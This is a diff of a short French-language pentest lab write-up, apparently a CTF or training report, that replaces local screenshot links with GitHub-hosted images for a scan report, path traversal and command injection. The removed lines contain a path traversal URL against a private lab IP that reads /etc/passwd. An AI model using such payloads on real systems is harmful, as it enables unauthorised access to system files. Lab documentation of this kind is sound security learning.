@@ -35,15 +35,17 @@ by M0rPH3U53
 
 Rapport après fin de scan
 
-![Capture du 2025-02-09 18-32-13.png](../../_resources/Capture%20du%202025-02-09%2018-32-13.png)
+<img width="1108" height="792" alt="Capture du 2025-02-09 18-32-13" src="https://github.com/user-attachments/assets/a52d2161-f939-43fd-a5ff-b9e951a5cabe" />
+
 
 &nbsp;
 
 Traverser de chemin
 
-[http://192.168.56.75/account/documents?page=…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F /etc/passwd](http://192.168.56.75/account/documents?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%20/etc/passwd)
+<img width="966" height="743" alt="path_traversal" src="https://github.com/user-attachments/assets/9a830634-dce3-4295-af00-990f55f8fff0" />
 
-![path_traversal.png](../../_resources/path_traversal.png)
+<img width="603" height="425" alt="injection_commande" src="https://github.com/user-attachments/assets/30e23814-db38-4e8a-b3a1-b067d5e7e7ce" />
+
 
 &nbsp;
 
